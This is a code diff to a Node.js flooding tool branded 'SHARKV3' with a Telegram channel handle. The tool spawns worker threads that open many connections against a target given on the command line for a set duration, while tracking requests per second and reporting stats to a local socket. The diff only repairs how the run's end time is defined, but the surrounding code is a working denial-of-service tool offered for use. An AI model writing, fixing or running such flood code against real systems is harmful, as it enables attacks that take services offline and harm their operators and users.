@@ -15,6 +15,7 @@ let successCount = 0;
 let errorCount = 0;
 let maxRps = 0;
 let rpsLastSecond = 0;
+let end;  // Define the `end` variable here for the main thread
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -25,10 +26,13 @@ if (isMainThread) {
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
 
+    end = Date.now() + duration * 1000; // Define end time here in the main thread
+
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
     console.log(`SHARKV3! - NO CPU WARMUP .exx`);
 
+    // Start the workers
     for (let i = 0; i < THREADS; i++) {
         new Worker(__filename, { workerData: { target, duration, initial: true } });
     }
@@ -93,13 +97,13 @@ if (isMainThread) {
 } else {
     const { target, duration, initial } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
-    const end = Date.now() + duration * 1000;
+    const endTime = Date.now() + duration * 1000;  // end time for worker threads
 
     const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
     function sendLoop(client, inflight) {
-        if (Date.now() > end || client.destroyed) return;
+        if (Date.now() > endTime || client.destroyed) return;
 
         if (inflight.count < MAX_INFLIGHT) {
             try {
@@ -128,7 +132,7 @@ if (isMainThread) {
     }
 
     function createConnection() {
-        if (Date.now() > end) return;
+        if (Date.now() > endTime) return;
 
         let client;
         try {
